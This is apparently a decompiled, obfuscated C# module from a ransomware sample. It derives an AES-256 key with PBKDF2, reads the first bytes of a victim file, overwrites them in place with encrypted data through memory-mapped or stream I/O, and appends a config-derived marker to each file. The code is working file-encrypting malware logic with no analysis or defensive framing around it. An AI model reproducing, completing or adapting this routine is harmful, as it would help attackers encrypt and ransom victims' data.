using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

public static class YQWUSoctiyTfY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] PweaAYgfrHWgvSL(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = nHnxfQTxlmn(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes nHnxfQTxlmn(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] LoatnGvftUwX(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (yIZYKSYRaZXoZvGddM.lAmPIwcPEjNhXG == getString_0(107396928))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (yIZYKSYRaZXoZvGddM.geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(yIZYKSYRaZXoZvGddM.UvHPjcAlchtwE, getString_0(107389326) + string_0 + getString_0(107401839) + ex.Message + getString_0(107396781));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void cPwpfRLVLwkR(string IUdoiJFmoLEExqz, byte[] EvuIFAZTaVnqAXFR, byte[] BGqjlFsUzej = null)
	{
		try
		{
			byte[] array = null;
			if (yIZYKSYRaZXoZvGddM.lAmPIwcPEjNhXG == getString_0(107396928))
			{
				array = (yIZYKSYRaZXoZvGddM.HHLzNKWftxhcT ? Encoding.ASCII.GetBytes(yIZYKSYRaZXoZvGddM.dAXyboFAql(yIZYKSYRaZXoZvGddM.JdCefxYFMIQXhE) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401781)) + Convert.ToString(yIZYKSYRaZXoZvGddM.LSeqdHjjsVhLqcK) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401781))) : Encoding.ASCII.GetBytes(yIZYKSYRaZXoZvGddM.dAXyboFAql(yIZYKSYRaZXoZvGddM.JdCefxYFMIQXhE) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401790)) + Convert.ToString(yIZYKSYRaZXoZvGddM.LSeqdHjjsVhLqcK) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401790))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(IUdoiJFmoLEExqz, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(EvuIFAZTaVnqAXFR, 0, EvuIFAZTaVnqAXFR.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(IUdoiJFmoLEExqz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!yIZYKSYRaZXoZvGddM.HHLzNKWftxhcT)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(BGqjlFsUzej, 0, BGqjlFsUzej.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (yIZYKSYRaZXoZvGddM.HHLzNKWftxhcT ? Encoding.ASCII.GetBytes(yIZYKSYRaZXoZvGddM.dAXyboFAql(yIZYKSYRaZXoZvGddM.JdCefxYFMIQXhE) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401781)) + Convert.ToString(yIZYKSYRaZXoZvGddM.LSeqdHjjsVhLqcK) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401781))) : Encoding.ASCII.GetBytes(yIZYKSYRaZXoZvGddM.dAXyboFAql(yIZYKSYRaZXoZvGddM.JdCefxYFMIQXhE) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401790)) + Convert.ToString(yIZYKSYRaZXoZvGddM.LSeqdHjjsVhLqcK) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401790))));
			FileStream fileStream2 = new FileStream(IUdoiJFmoLEExqz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(EvuIFAZTaVnqAXFR, 0, EvuIFAZTaVnqAXFR.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(IUdoiJFmoLEExqz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!yIZYKSYRaZXoZvGddM.HHLzNKWftxhcT)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(BGqjlFsUzej, 0, BGqjlFsUzej.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (yIZYKSYRaZXoZvGddM.geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(yIZYKSYRaZXoZvGddM.UvHPjcAlchtwE, getString_0(107389326) + IUdoiJFmoLEExqz + getString_0(107401740) + ex.Message + getString_0(107396781));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (yIZYKSYRaZXoZvGddM.HHLzNKWftxhcT ? Encoding.ASCII.GetBytes(yIZYKSYRaZXoZvGddM.dAXyboFAql(yIZYKSYRaZXoZvGddM.JdCefxYFMIQXhE) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401781)) + Convert.ToString(yIZYKSYRaZXoZvGddM.LSeqdHjjsVhLqcK) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401781))) : Encoding.ASCII.GetBytes(yIZYKSYRaZXoZvGddM.dAXyboFAql(yIZYKSYRaZXoZvGddM.JdCefxYFMIQXhE) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401790)) + Convert.ToString(yIZYKSYRaZXoZvGddM.LSeqdHjjsVhLqcK) + yIZYKSYRaZXoZvGddM.dAXyboFAql(getString_0(107401790))));
			FileStream fileStream4 = new FileStream(IUdoiJFmoLEExqz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(EvuIFAZTaVnqAXFR, 0, EvuIFAZTaVnqAXFR.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(IUdoiJFmoLEExqz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!yIZYKSYRaZXoZvGddM.HHLzNKWftxhcT)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(BGqjlFsUzej, 0, BGqjlFsUzej.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static YQWUSoctiyTfY()
	{
		Strings.CreateGetStringDelegate(typeof(YQWUSoctiyTfY));
	}
}
